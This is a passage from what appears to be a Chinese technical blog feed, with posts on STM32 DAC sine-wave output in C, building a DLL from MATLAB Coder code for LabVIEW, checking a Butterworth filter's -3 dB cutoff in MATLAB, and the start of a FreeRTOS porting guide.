<h2 id="DAC-基本输出方式"><a href="#DAC-基本输出方式" class="headerlink" title="DAC 基本输出方式"></a>DAC 基本输出方式</h2><h3 id="DAC-参数设置"><a href="#DAC-参数设置" class="headerlink" title="DAC 参数设置"></a>DAC 参数设置</h3><p>在<code>stm32f103</code>中包含2个通道的12位<code>D/A</code>转换器，<code>PA4</code>与<code>PA5</code>作为两个通道输出接口，在使用时需要配置为模拟输入<code>AIN</code>。当使能 DAC 的输出通道后，相应的 GPIO 管脚将自动与 DAC 的模拟输出接口（DAC_OUTx）相连。</p>
<pre><code class="C">void dacConfig(void)
{
  GPIO_InitTypeDef  GPIO_InitStructure;
  DAC_InitTypeDef DAC_InitStructure;

  /* 开启GPIOA时钟 */
  RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA, ENABLE);

  GPIO_InitStructure.GPIO_Pin = GPIO_Pin_4;
  GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;
  GPIO_InitStructure.GPIO_Mode = GPIO_Mode_AIN;
  /* 配置DAC输出通道 */
  GPIO_Init(GPIOA, &amp;GPIO_InitStructure);


  /* 开启DAC时钟 */
  RCC_APB1PeriphClockCmd(RCC_APB1Periph_DAC,ENABLE);

  DAC_InitStructure.DAC_Trigger = DAC_Trigger_None;                  // 无触发
  DAC_InitStructure.DAC_WaveGeneration = DAC_WaveGeneration_None;    // 无波形生成
  DAC_InitStructure.DAC_LFSRUnmask_TriangleAmplitude = DAC_LFSRUnmask_Bit0;
  DAC_InitStructure.DAC_OutputBuffer = DAC_OutputBuffer_Disable;     // 禁用输出缓存
  /* 配置DAC参数 */
  DAC_Init(DAC_Channel_1,&amp;DAC_InitStructure);

  /* enable dac1 */
  DAC_Cmd(DAC_Channel_1,ENABLE);
}
</code></pre>
<h3 id="设置-DAC-输出电压"><a href="#设置-DAC-输出电压" class="headerlink" title="设置 DAC 输出电压"></a>设置 DAC 输出电压</h3><p>经测试，我所用最小系统板的DA参考电压并非<code>3.3v</code>，而是接近于<code>3.24v</code>，我们可以通过宏定义配置好参考电压。</p>
<pre><code class="C">#define REFERENCE_VOLTAGE 3.24f      // DAC 参考电压
</code></pre>
<p>根据公式 <code>data = 4095*(v/v_ref)</code>可以求得电压v对应的12位数。</p>
<pre><code class="C">void setVoltage(double voltage)
{
  uint16_t temp;

  if(voltage &lt; 0.0 || voltage &gt; REFERENCE_VOLTAGE)
    return;

  temp = (uint16_t)(4095*voltage/REFERENCE_VOLTAGE) &amp; 0x0fff;

  DAC_SetChannel1Data(DAC_Align_12b_R,temp);     // 电压输出：12位右对齐
}
</code></pre>
<h3 id="产生正弦波信号"><a href="#产生正弦波信号" class="headerlink" title="产生正弦波信号"></a>产生正弦波信号</h3><p>使用宏定义<code>PI</code>以及采样频率，并添加头文件<code>math.h</code>。</p>
<pre><code class="C">#include &lt;math.h&gt;

#define PI  3.14159f
#define FSAMPLE 100                 // 采样频率 （Hz）
</code></pre>
<p>使用<code>sin</code>函数和一个<code>static</code>变量即可生成正弦信号。</p>
<pre><code class="C">void createSinWave(double baseAmp, double amp, double frequency, double fSample)
{
  static uint32_t time = 0;
  double voltage = 0.0;

  voltage = amp*sin(2*PI*frequency*time/fSample) + baseAmp;
  time++;

  setVoltage(voltage);
}
</code></pre>
<p>修改<code>main</code>函数，每隔一个采样周期修改一次DA输出电压，完成正弦信号的输出。</p>
<pre><code class="C">int main(void)
{
  dacConfig();
  while(1)
  {
    createSinWave(2,0.5,1,FSAMPLE); // 产生 2±0.5v , 1Hz 的正弦信号
    delayMs(1000.0/FSAMPLE);
  }
}
</code></pre>
<h3 id="查看波形"><a href="#查看波形" class="headerlink" title="查看波形"></a>查看波形</h3><p>使用示波器或NI采集卡即可查看生成的正弦信号。</p>
<p><img src="/assets/stm32/dacOutput.png" alt="DacOutput"></p>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> stm32 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Matlab - 经VS将.m文件转换为.dll文件]]></title>
      <url>https://www.litreily.top/2016/11/25/matlab-coder/</url>
      <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在使用 LabVIEW 进行软件开发的过程中，有时需要使用 Matlab 强大的数据处理功能，以提高开发效率，此时可以通过 Matlab Coder 将 Matlab 中的函数转换为 C/C++ 源文件，然后通过 Visual Studio 将这些源文件封装为 .dll 文件，最后通过 LabVIEW 调用库函数实现对 Matlab 函数的调用。</p>
<p>本文将通过一个实例讲述以上功能的实现过程，大体步骤如下：</p>
<ol>
<li>Matlab 编写代码<br> 1.1 编写 .m 函数<br> 1.2 使用 Coder 生成 C/C++ 文件</li>
<li>Visual Studio 生成 .dll 文件</li>
<li>LabVIEW 调用 .dll文件</li>
</ol>
<p>软件版本说明：</p>
<ol>
<li>Matlab 2016a       (64bit)</li>
<li>LabVIEW 2015       (64bit)</li>
<li>Visual Studio 2015 (64bit)</li>
</ol>
<h2 id="通过-Matlab-生成-C-C-源文件"><a href="#通过-Matlab-生成-C-C-源文件" class="headerlink" title="通过 Matlab 生成 C/C++ 源文件"></a>通过 Matlab 生成 C/C++ 源文件</h2><h3 id="m-函数编码"><a href="#m-函数编码" class="headerlink" title=".m 函数编码"></a>.m 函数编码</h3><p>在 Matlab 文件目录中新建文件夹&quot;CreateDll&quot;，在该文件夹下新建两个函数文件，分别实现简单加法运算函数，以及一个用自相关求解周期信号频率的函数。</p>
<p>add(a, b)</p>
<pre><code class="matlab">function [ answer ] = add( a,b )
% 加法运算
% a,b 均为 double 型数据

answer = a + b;

end
</code></pre>
<p>getFreq( signal, fs )</p>
<pre><code class="matlab">function [ frequency ] = getFreq( signal,fs )
%GETFREQ 自相关法求周期信号频率
% [input]
% signal    : double 1*n
% fs        : double 1*1
% [output]
% frequency : double  1*1

y_xcorr = xcorr(signal,&#39;coeff&#39;);            % 信号自相关
[~,locs] = findpeaks(y_xcorr);              % 获取峰值位置
middlePosition = fix(length(locs)/2);       % 计算处于中部的峰值位置
frequency = fs/(locs(middlePosition)-locs(middlePosition-1)); % 计算信号频率

end
</code></pre>
<h3 id="使用-Coder-生成-C-C-文件"><a href="#使用-Coder-生成-C-C-文件" class="headerlink" title="使用 Coder 生成 C/C++ 文件"></a>使用 Coder 生成 C/C++ 文件</h3><ul>
<li>1.在命令行中输入 coder 打开 Matlab Coder 工具。</li>
</ul>
<pre><code class="matlab">&gt;&gt; coder
</code></pre>
<p><img src="/assets/matlab/coder1.png" alt="Matlab Coder"></p>
<ul>
<li>2.添加 add 函数及 getFreq 函数</li>
</ul>
<p><img src="/assets/matlab/coder2.png" alt="Matlab Coder"></p>
<ul>
<li>3.定义函数输入参数的数据类型（两种定义方式）</li>
</ul>
<ol>
<li>手动修改输入参数的数据类型</li>
<li>输入函数调用示例，通过 Coder 工具的自定义输入功能自动匹配输入参数类型</li>
</ol>
<p>调用示例：</p>
<pre><code class="matlab">&gt;&gt; add(3,4);
</code></pre>
<p><img src="/assets/matlab/coder3.png" alt="Matlab Coder"></p>
<p>手动可选择的数据类型如下图所示：</p>
<p><img src="/assets/matlab/coder3_1.png" alt="Input types"></p>
<ul>
<li>4.设定数据长度</li>
</ul>
<ol>
<li>对于大部分变量，数据长度为 1×1</li>
<li>对于一维<strong>向量、数组</strong><br>2.1 固定长度的变量：直接设定具体值（如：一个星期每天的工作时间，可设为 1×7）<br>2.2 不定长度但有上限的变量：设定 1×:100 （假定上限值为 100）<br>2.3 不定长度上限不定的变量：设定 1×:inf （inf代表无限）</li>
<li>二维数组设定规则与一维数组类似</li>
</ol>
<p><img src="/assets/matlab/coder3_2.png" alt="Input length"></p>
<ul>
<li>5.Check for Run-Time Issues</li>
</ul>
<p>这一步可以跳过，这是用来生成试用代码以及用于 Matlab 的 MEX 文件。</p>
<p><img src="/assets/matlab/coder4.png" alt="Check for Run-Time Issues"></p>
<ul>
<li>6.Generate Code</li>
</ul>
<p>选择 C++ 语言，通过 &quot; More Settings &quot; 修改代码生成相关的配置选项,最后点击 &quot; Generate &quot; 按钮生成源代码。</p>
<p>选择语言&lt;<img src="/assets/matlab/coder5.png" alt="Generate Code"></p>
<p>配置选项&lt;<img src="/assets/matlab/coder5_1.png" alt="More Settings"></p>
<p>生成代码&lt;<img src="/assets/matlab/coder6.png" alt="C++ Code"></p>
<p>在代码生成界面可以看到以下内容：</p>
<ol>
<li>Source Code : Matlab 中创建的函数源代码</li>
<li>Output Files : Coder 工具生成得到的 .h 头文件和 .cpp 源文件</li>
<li>Build Log : 用于查看代码生成报告</li>
<li>Variables : 选中 Matlab 文件时显示函数的输入输出数据类型和大小</li>
</ol>
<ul>
<li>7.Finsh Workflow</li>
</ul>
<p>完成工作流程&lt;<img src="/assets/matlab/coder7.png" alt="Finish WorkFlow"></p>
<p>查看代码&lt;<img src="/assets/matlab/coder8.png" alt="Select Code"></p>
<p>可以看出，最终生成的文件较多，代码量较大，这可以归结为以下几个原因：</p>
<ol>
<li>重新实现fft等复杂算法</li>
<li>考虑各种异常情况的处理</li>
<li>考虑不定长数组或向量的内存分配问题</li>
<li>考虑无限值 inf 和 无效值 NaN</li>
<li>不同编程语言间数据类型的转换</li>
</ol>
<p>当然，我们可以在代码生成前根据需求进行相关设置，以避免不必要文件的产生，此处不予详述。</p>
<p>最后将生成的所有 .h/.cpp 文件复制到剪切板中以备后用。至此，Matlab 部分的工作已经全部完成。</p>
<h2 id="通过-Visual-Studio-生成-dll-文件"><a href="#通过-Visual-Studio-生成-dll-文件" class="headerlink" title="通过 Visual Studio 生成 .dll 文件"></a>通过 Visual Studio 生成 .dll 文件</h2><p>在 VS 中要做的就是将 Matlab Coder 生成的 C++ 文件封装为 dll 文件，以供 LabVIEW 程序调用。</p>
<h3 id="创建-win32-项目"><a href="#创建-win32-项目" class="headerlink" title="创建 win32 项目"></a>创建 win32 项目</h3><p><img src="/assets/matlab/CreateDll.png" alt="Create VS Project"></p>
<p>在win32应用程序向导中选择 <strong>DLL</strong>，并勾选 <strong>空项目</strong> ，然后点击完成。</p>
<p><img src="/assets/matlab/CreateDll1.png" alt="Create VS Project"></p>
<h3 id="添加文件"><a href="#添加文件" class="headerlink" title="添加文件"></a>添加文件</h3><p>将从 Matlab 中复制的 C++ 文件粘贴到 CreateDll 项目的本地文件中，然后在项目中添加这些文件。</p>
<p><img src="/assets/matlab/CreateDll2_1.png" alt="Add Source Files to VS Project"></p>
<p><img src="/assets/matlab/CreateDll2.png" alt="Add Source Files to VS Project"></p>
<h3 id="新建模块定义文件"><a href="#新建模块定义文件" class="headerlink" title="新建模块定义文件"></a>新建模块定义文件</h3><p>在 VS 中新建 .def 模块定义文件，输入以下代码</p>
<pre><code class="def">LIBRARY CreateDll

EXPORTS

add
getFreq
</code></pre>
<p>LIBRARY 后面添加库名称，EXPORTS 后面添加需要导出的函数名称。</p>
<p><img src="/assets/matlab/CreateDll3.png" alt=".def file"></p>
<p>编辑完成后，可以在 &quot;项目属性&gt;&gt;链接器&gt;&gt;输入&gt;&gt;模块定义文件&quot; 中看到，项目已将该选项自动添加为了当前 .def 文件，对于低版本的 VS 可能需要手动添加。</p>
<h3 id="生成-dll-文件"><a href="#生成-dll-文件" class="headerlink" title="生成 .dll 文件"></a>生成 .dll 文件</h3><p>最后一步，选中项目名称，点击右键选择 &quot;<strong>生成</strong>&quot; ，从本地项目目录的 Debug 文件夹中可以找到已生成的 .dll 文件。</p>
<p>值得注意的是：</p>
<ol>
<li>选择 Debug 模式为 x64 时生成 64 位 dll 文件，文件存于 .\x64\Debug\Create.dll</li>
<li>选择 Debug 模式为 x86 时生成 32 位 dll 文件，文件存于 .\Debug\Create.dll</li>
</ol>
<p>对于不同位数的 LabVIEW 程序，我们可以选择对应的 Debug 模式，这个功能真的是非常棒！</p>
<p><img src="/assets/matlab/CreateDll4.png" alt="Bulid .dll file"></p>
<h3 id="函数接口"><a href="#函数接口" class="headerlink" title="函数接口"></a>函数接口</h3><p>经 VS 生成的 API 函数接口说明如下：</p>
<p>add</p>
<pre><code class="C++">double add(double a, double b);
</code></pre>
<p>getFreq</p>
<pre><code class="C++">double getFreq(const double b_signal[1000], double fs);
</code></pre>
<p>因为例程所用数据为定长数组（1×1000），所以输入参数的数据类型为基本的 double 型。倘若定义的 b_signal 为不定长数组 （1×:inf） ,其格式将变为：</p>
<pre><code class="C++">double getFreq(const emxArray_real_T *b_signal, double fs);
</code></pre>
<p>这是因为程序需要为不确定长度的数组动态分配内存，所以有效数据与其描述信息将被封装到结构体中，该结构体为 &quot;<strong>emxArray_real_T</strong>&quot;</p>
<pre><code class="C++">struct emxArray_real_T
{
  double *data;
  int *size;
  int allocatedSize;
  int numDimensions;
  boolean_T canFreeData;
};
</code></pre>
<p>结构体中的 &quot;<strong>boolean_T</strong>&quot; 定义如下</p>
<pre><code class="C++">typedef unsigned char boolean_T;
</code></pre>
<p>由于不定长数据会导致大量冗余代码，并且在 LabVIEW 中调用时非常麻烦，除非必须，否则不建议使用，本文后续所述也是定长数组。</p>
<h2 id="通过-LabVIEW-调用-dll文件"><a href="#通过-LabVIEW-调用-dll文件" class="headerlink" title="通过 LabVIEW 调用 .dll文件"></a>通过 LabVIEW 调用 .dll文件</h2><p>通过 VS，我们已经得到了想要的 .dll 文件，那么在 LabVIEW 中该如何调用呢？这里提供两种方法。</p>
<ol>
<li>通过调用库函数节点（Call Library Function Node）</li>
<li>通过 LabVIEW 导入工具（Tools-&gt;Import-&gt;Shared Library(.dll)...）</li>
</ol>
<p>两种方法的原理一致，以第一种方法为例进行讲解。</p>
<h3 id="Call-Library-Function-Node"><a href="#Call-Library-Function-Node" class="headerlink" title="Call Library Function Node"></a>Call Library Function Node</h3><p>在 LabVIEW 函数面板搜索 &quot;Call Library&quot; ，中文版可直接搜索 <code>dll</code>。将调用库函数节点放入程序框图中。</p>
<p>调用 add 函数</p>
<ul>
<li>选择 CreateDll.dll 文件</li>
</ul>
<p><img src="/assets/matlab/UseDll1.png" alt="select CreateDll.dll"></p>
<ul>
<li>配置 add 函数接口</li>
</ul>
<p><img src="/assets/matlab/UseDll1_1.png" alt="Config add function"></p>
<ul>
<li>函数调用示例</li>
</ul>
<p><img src="/assets/matlab/UseDll1_2.png" alt="Use add function"></p>
<p>调用 getFreq 函数</p>
<ul>
<li>配置 getFreq 函数接口</li>
</ul>
<p><img src="/assets/matlab/UseDll2.png" alt="Config getFreq function"></p>
<ul>
<li>函数调用示例</li>
</ul>
<p><img src="/assets/matlab/UseDll2_2.png" alt="getFreq front panel"></p>
<p>先产生一个数据长度为 1000 ，频率可调的正弦信号，采样频率 1kHz；然后调用 .dll文件中的 getFreq 函数，通过自相关方法求取信号频率，并输出到变量 getFreq 中。</p>
<p><img src="/assets/matlab/UseDll2_3.png" alt="getFreq block diagram"></p>
<h3 id="不定长数组问题"><a href="#不定长数组问题" class="headerlink" title="不定长数组问题"></a>不定长数组问题</h3><p>这里对不定长数组问题进行简单介绍：.dll 文件中的函数将不再是简单的 double 指针，而是一个结构体指针；在 LabVIEW 中调用时，可以创建自定义控件，用簇代替该结构体，簇的引用作为结构体指针；簇的内容包括以下几部分。</p>
<pre><code class="c">double *pData : 一维数组引用，用于传递信号数据
int    *pSize : 一维数组引用，用于传递数据长度
int allocatedSize : 分配内存大小，调用时可设为 0
int numDimensions : 数组维数，设为 1 或 2
unsigned char canFreeData : 布尔变量，确定能否释放数据内存
</code></pre>
<p><img src="/assets/matlab/UseDll2_1.png" alt="Create customsize control"></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文对 &quot;Matlab Coder 生成 C++ 代码&quot;，&quot;VS 生成 .dll 文件&quot;，&quot;LabVIEW 调用外部库函数&quot; 这三部分内容进行讲述。通过Matlab , VS , LabVIEW 的结合使用，我们便可实现 LabVIEW 程序调用 Matlab 函数的目的。</p>
<p>此外，在 64 位的 VS 中可以通过修改 Debug 模式生成 32 位或 64 位的动态链接库，以适配不同版本的 LabVIEW。当然最后不要忘了，不同编译模式下生成的 .dll 文件存放在不同的目录下。</p>
]]></content>
      
        <categories>
            
            <category> Matlab </category>
            
        </categories>
        
        
        <tags>
            
            <tag> labview </tag>
            
            <tag> matlab </tag>
            
            <tag> VS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Matlab - 设计滤波器截止频率]]></title>
      <url>https://www.litreily.top/2016/11/14/signal-Process/</url>
      <content type="html"><![CDATA[<h2 id="截止频率"><a href="#截止频率" class="headerlink" title="截止频率"></a>截止频率</h2><p>通常，我们将信号幅值衰减3dB处的频率作为截止频率，这是为何？</p>
<p>首先，明确以下两点：</p>
<ol>
<li>幅值的平方为功率</li>
<li>信号功率衰减一半时的频率被称为<strong>截止频率</strong></li>
</ol>
<p>当信号功率衰减一半 (1/2) 时，幅值衰减 sqrt(1/2) ，那么其对应的 dB 值为：</p>
<pre><code class="bash">20*log10(sqrt(2)/2) ≈ -3dB
</code></pre>
<h2 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h2><h3 id="滤波器设计"><a href="#滤波器设计" class="headerlink" title="滤波器设计"></a>滤波器设计</h3><p>设计一个 butterworth 低通滤波器，采样频率 100Hz ，截止频率 20Hz ，阶次为 4 。</p>
<pre><code class="matlab">clc
fs = 100;           % 采样频率
tLen = 2;           % 时间长度
pointNum = fs*2;    % 采样点数
fpass = 20;         % 通带频率

wp = fpass/(fs/2);      % 计算归一化角频率
[b,a] = butter(4,wp);   % 设计滤波器

% 获取频率特性
[H,F] = freqz(b,a,pointNum,fs);
H = 20*log10(abs(H));

hold off
plot(F,H);grid on;hold on

fcAmp = H(fpass*2*pointNum/fs+1);
stem(fpass,fcAmp,&#39;linewidth&#39;,2);
text(fpass+2,fcAmp-1,num2str(fcAmp));

setPlot(&#39;滤波器幅频特性&#39;,&#39;frequency(Hz)&#39;,&#39;amptitude(dB)&#39;,[F(1) F(end)],[-50,10]);
</code></pre>
<h3 id="setPlot"><a href="#setPlot" class="headerlink" title="setPlot"></a>setPlot</h3><p>程序中用到的 setPlot 函数用于设置图形的 title , xlabel , ylabel , xlim , ylim.</p>
<pre><code class="matlab">function [  ] = setPlot( varargin )
% setPlot()
% setPlot(title)
% setPlot(title,xlabel)
% setPlot(title,xlable,ylabel)
% setPlot(title,xlabel,ylabel,xlim)
% setPlot(title,xlable,ylabel,xlim,ylim)

narginchk(0,5);     % 判断输入参数是否足够

grid on;
axis tight;

if nargin&gt;=1
    title(varargin{1});
end

if nargin&gt;=2
    xlabel(varargin{2});
end

if nargin&gt;=3
    ylabel(varargin{3});
end

if nargin&gt;=4
    xlim(varargin{4});
end

if nargin&gt;=5
    ylim(varargin{5});
end

end
</code></pre>
<h3 id="滤波器幅频特性"><a href="#滤波器幅频特性" class="headerlink" title="滤波器幅频特性"></a>滤波器幅频特性</h3><p><img src="/assets/matlab/fc20Hz.png" alt="截止频率"></p>
<p>从图中可以看出，按照要求设计得到的滤波器，截止频率 20Hz 对应的幅值衰减为 -3.0103dB ,约为 -3dB ，与理论所述相吻合。</p>
]]></content>
      
        <categories>
            
            <category> Matlab </category>
            
        </categories>
        
        
        <tags>
            
            <tag> signal </tag>
            
            <tag> matlab </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[stm32 - FreeRTOS系统移植]]></title>
      <url>https://www.litreily.top/2016/11/02/FreeRTOS/</url>
      <content type="html"><![CDATA[<p>前段时间研究了一下 FreeRTOS 在 stm32 的系统移植，觉得有必要做个总结，记录这研发路上的点点滴滴。</p>
<h2 id="FreeRTOS"><a href="#FreeRTOS" class="headerlink" title="FreeRTOS"></a>FreeRTOS</h2><p>从 <a href="http://www.freertos.org/" target="_blank" rel="noopener">FreeRTOS官网</a> 下载最新源码，我下载的是 <a href="http://pan.baidu.com/s/1jIbOqDg" target="_blank" rel="noopener">FreeRTOSv9.0.0</a> ，其文件结构如下，根目录主要包含 FreeRTOS 和 FreeRTOS-Plus 两个文件夹， Plus 版系统添加了 TCP/UDP 等网络通信功能。</p>
<pre><code class="txt">D:\FREERTOSV9.0.0
│  New - Direct to Task Notifications.html
│  New - FreeRTOS+TCP.html
│  Quick_Start_Guide.html
│  Upgrading-to-FreeRTOS-9.html
│  readme.txt
│
├─FreeRTOS
│   │  links_to_doc_pages_for_the_demo_projects.html
│   │  readme.txt
│   │
│   ├─Demo
│   ├─License
│   └─Source
│
└─FreeRTOS-Plus
    │  readme.txt
    │
    ├─Demo
    └─Source
</code></pre>
<p>暂且不考虑plus版，打开FreeRTOS文件夹，其中包含3个文件夹：</p>
<ol>
<li>Demo：不同处理器的FreeRTOS系统移植例程</li>
<li>License：许可证，对FreeRTOS使用范围进行授权</li>
<li>Source：FreeRTOS源码</li>
</ol>
<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>Demo 包含了官方提供的所有已适配处理器的移植例程，我们可以根据自己所用芯片和开发环境选择合适的例程进行学习。</p>
<pre><code class="txt">ARM7_AT91FR40008_GCC
ARM7_AT91SAM7S64_IAR
ARM7_AT91SAM7X256_Eclipse
ARM7_LPC2106_GCC
ARM7_LPC2129_IAR
ARM7_LPC2129_Keil_RVDS
ARM7_LPC2138_Rowley
ARM7_LPC2368_Eclipse
ARM7_LPC2368_Rowley
ARM7_STR71x_IAR
ARM7_STR75x_GCC
ARM7_STR75x_IAR
ARM9_AT91SAM9XE_IAR
ARM9_STR91X_IAR
AVR32_UC3
AVR_ATMega323_IAR
AVR_ATMega323_WinAVR
ColdFire_MCF51CN128_CodeWarrior
ColdFire_MCF52221_CodeWarrior
ColdFire_MCF52233_Eclipse
ColdFire_MCF52259_CodeWarrior
ColdFire_MCF5282_Eclipse
Common
CORTEX_A2F200_IAR_and_Keil
CORTEX_A2F200_SoftConsole
CORTEX_A53_64-bit_UltraScale_MPSoC
CORTEX_A5_SAMA5D2x_Xplained_IAR
CORTEX_A5_SAMA5D3x_Xplained_IAR
CORTEX_A5_SAMA5D4x_EK_IAR
CORTEX_A9_Cyclone_V_SoC_DK
CORTEX_A9_RZ_R7S72100_IAR_DS-5
CORTEX_A9_Zynq_ZC702
CORTEX_AT91SAM3U256_IAR
CORTEX_ATSAM3S-EK2_Atmel_Studio
CORTEX_ATSAM3X_Atmel_Studio
CORTEX_CY8C5588_PSoC_Creator_GCC
CORTEX_CY8C5588_PSoC_Creator_Keil
CORTEX_CY8C5588_PSoC_Creator_RVDS
CORTEX_EFM32_Giant_Gecko_Simplicity_Studio
CORTEX_EFM32_Pearl_Gecko_Simplicity_Studio
CORTEX_EFMG890F128_IAR
CORTEX_Kinetis_K60_Tower_IAR
CORTEX_LM3S102_GCC
CORTEX_LM3S102_Rowley
CORTEX_LM3S316_IAR
CORTEX_LM3S811_GCC
CORTEX_LM3S811_IAR
CORTEX_LM3S811_KEIL
CORTEX_LM3Sxxxx_Eclipse
CORTEX_LM3Sxxxx_IAR_Keil
CORTEX_LM3Sxxxx_Rowley
CORTEX_LPC1768_GCC_RedSuite
CORTEX_LPC1768_GCC_Rowley
CORTEX_LPC1768_IAR
CORTEX_M0+_Atmel_SAMD20_XPlained
CORTEX_M0_Infineon_XMC1000_IAR_Keil_GCC
CORTEX_M0_LPC1114_LPCXpresso
CORTEX_M0_STM32F0518_IAR
CORTEX_M4F_ATSAM4E_Atmel_Studio
CORTEX_M4F_CEC1302_Keil_GCC
CORTEX_M4F_CEC1302_MikroC
CORTEX_M4F_Infineon_XMC4000_GCC_Dave
CORTEX_M4F_Infineon_XMC4000_IAR
CORTEX_M4F_Infineon_XMC4000_Keil
CORTEX_M4F_Infineon_XMC4000_Tasking
CORTEX_M4F_Infineon_XMC4500_GCC_Atollic
CORTEX_M4F_M0_LPC43xx_Keil
CORTEX_M4F_MSP432_LaunchPad_IAR_CCS_Keil
CORTEX_M4F_STM32F407ZG-SK
CORTEX_M4_ATSAM4L_Atmel_Studio
CORTEX_M4_ATSAM4S_Atmel_Studio
CORTEX_M7_SAME70_Xplained_AtmelStudio
CORTEX_M7_SAMV71_Xplained_AtmelStudio
CORTEX_M7_SAMV71_Xplained_IAR_Keil
CORTEX_M7_STM32F7_STM32756G-EVAL_IAR_Keil
CORTEX_MB9A310_IAR_Keil
CORTEX_MB9B500_IAR_Keil
CORTEX_MPU_LM3Sxxxx_Rowley
CORTEX_MPU_LPC1768_GCC_RedSuite
CORTEX_MPU_Simulator_Keil_GCC
CORTEX_R4F_RZ_T_GCC_IAR
CORTEX_R4_RM48_TMS570_CCS5
CORTEX_R5_UltraScale_MPSoC
CORTEX_SmartFusion2_M2S050_SoftConsole
CORTEX_STM32F100_Atollic
CORTEX_STM32F103_GCC_Rowley
CORTEX_STM32F103_IAR
CORTEX_STM32F103_Keil
CORTEX_STM32F103_Primer_GCC
CORTEX_STM32F107_GCC_Rowley
CORTEX_STM32L152_Discovery_IAR
CORTEX_STM32L152_IAR
CORTUS_APS3_GCC
Cygnal
dsPIC_MPLAB
Flshlite
H8S
HCS12_CodeWarrior_banked
HCS12_CodeWarrior_small
HCS12_GCC_banked
IA32_flat_GCC_Galileo_Gen_2
lwIP_AVR32_UC3
lwIP_Demo_Rowley_ARM7
lwIP_MCF5235_GCC
MB91460_Softune
MB96340_Softune
MB96350_Softune_Dice_Kit
MCF5235_GCC
MicroBlaze_Kintex7_EthernetLite
MicroBlaze_Spartan-6_EthernetLite
MSP430X_MSP430F5438_CCS
MSP430X_MSP430F5438_IAR
MSP430X_MSP430FR5969_LaunchPad_IAR_CCS
msp430_CrossWorks
msp430_GCC
msp430_IAR
NEC_78K0R_IAR
NEC_V850ES_IAR
NiosII_CycloneIII_DBC3C40_GCC
PC
PIC18_MPLAB
PIC18_WizC
PIC24_MPLAB
PIC32MEC14xx_MPLAB
PIC32MX_MPLAB
PIC32MZ_MPLAB
PPC405_FPU_Xilinx_Virtex4_GCC
PPC405_Xilinx_Virtex4_GCC
PPC440_DP_FPU_Xilinx_Virtex5_GCC
PPC440_SP_FPU_Xilinx_Virtex5_GCC
PPC440_Xilinx_Virtex5_GCC
RL78_multiple_IAR
RL78_RL78G13_Promo_Board_IAR
RX100-RSK_GCC_e2studio
RX100-RSK_IAR
RX100-RSK_Renesas_e2studio
RX100_RX113-RSK_GCC_e2studio_IAR
RX100_RX113-RSK_Renesas_e2studio
RX200_RX210-RSK_Renesas
RX200_RX231-RSK_GCC_e2studio_IAR
RX200_RX231-RSK_Renesas_e2studio
RX600_RX62N-RDK_GNURX
RX600_RX62N-RDK_IAR
RX600_RX62N-RDK_Renesas
RX600_RX62N-RSK_GNURX
RX600_RX62N-RSK_IAR
RX600_RX62N-RSK_Renesas
RX600_RX630-RSK_Renesas
RX600_RX63N-RDK_Renesas
RX600_RX64M_RSK_GCC_e2studio
RX600_RX64M_RSK_Renesas_e2studio
RX700_RX71M_RSK_GCC_e2studio_IAR
RX700_RX71M_RSK_Renesas_e2studio
SuperH_SH7216_Renesas
TriCore_TC1782_TriBoard_GCC
uIP_Demo_IAR_ARM7
uIP_Demo_Rowley_ARM7
Unsupported_Demos
WIN32-MingW
WIN32-MSVC
WIN32-MSVC-Static-Allocation-Only
WizNET_DEMO_GCC_ARM7
WizNET_DEMO_TERN_186
Xilinx_FreeRTOS_BSP

</code></pre>
<h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p>Source 是 FreeRTOS 的核心，包含了系统内核及各类处理器系统移植所需的源码。</p>
<pre><code class="txt">
D:\FREERTOSV9.0.0\FREERTOS\SOURCE
│  croutine.c
│  event_groups.c
│  list.c
│  queue.c
│  readme.txt
│  tasks.c
│  timers.c
│
├─include
│      croutine.h
│      deprecated_definitions.h
│      event_groups.h
│      FreeRTOS.h
│      list.h
│      mpu_prototypes.h
│      mpu_wrappers.h
│      portable.h
│      projdefs.h
│      queue.h
│      semphr.h
│      StackMacros.h
│      stdint.readme
│      task.h
│      timers.h
│
└─portable
    │  readme.txt
    │
    ├─BCC
    │  └─16BitDOS
    │      ├─common
    │      │      portasm.h
    │      │      portcomn.c
    │      │
    │      ├─Flsh186
    │      │      port.c
    │      │      prtmacro.h
    │      │
    │      └─PC
    │              port.c
    │              prtmacro.h
    │
    ├─CCS
    │  ├─ARM_CM4F
    │  │      port.c
    │  │      portasm.asm
    │  │      portmacro.h
    │  │
    │  ├─ARM_Cortex-R4
    │  │      port.c
    │  │      portASM.asm
    │  │      portmacro.h
    │  │
    │  └─MSP430X
    │          data_model.h
    │          port.c
    │          portext.asm
    │          portmacro.h
    │
    ├─CodeWarrior
    │  ├─ColdFire_V1
    │  │      port.c
    │  │      portasm.S
    │  │      portmacro.h
    │  │
    │  ├─ColdFire_V2
    │  │      port.c
    │  │      portasm.S
    │  │      portmacro.h
    │  │
    │  └─HCS12
    │          port.c
    │          portmacro.h
    │
    ├─Common
    │      mpu_wrappers.c
    │
    ├─GCC
    │  ├─ARM7_AT91FR40008
    │  │      port.c
    │  │      portISR.c
    │  │      portmacro.h
    │  │
    │  ├─ARM7_AT91SAM7S
    │  │      AT91SAM7X256.h
    │  │      ioat91sam7x256.h
    │  │      lib_AT91SAM7X256.c
    │  │      lib_AT91SAM7X256.h
    │  │      port.c
    │  │      portISR.c
    │  │      portmacro.h
    │  │
    │  ├─ARM7_LPC2000
    │  │      port.c
    │  │      portISR.c
    │  │      portmacro.h
    │  │
    │  ├─ARM7_LPC23xx
    │  │      port.c
    │  │      portISR.c
    │  │      portmacro.h
    │  │
    │  ├─ARM_CA53_64_BIT
    │  │      port.c
    │  │      portASM.S
    │  │      portmacro.h
    │  │
    │  ├─ARM_CA9
    │  │      port.c
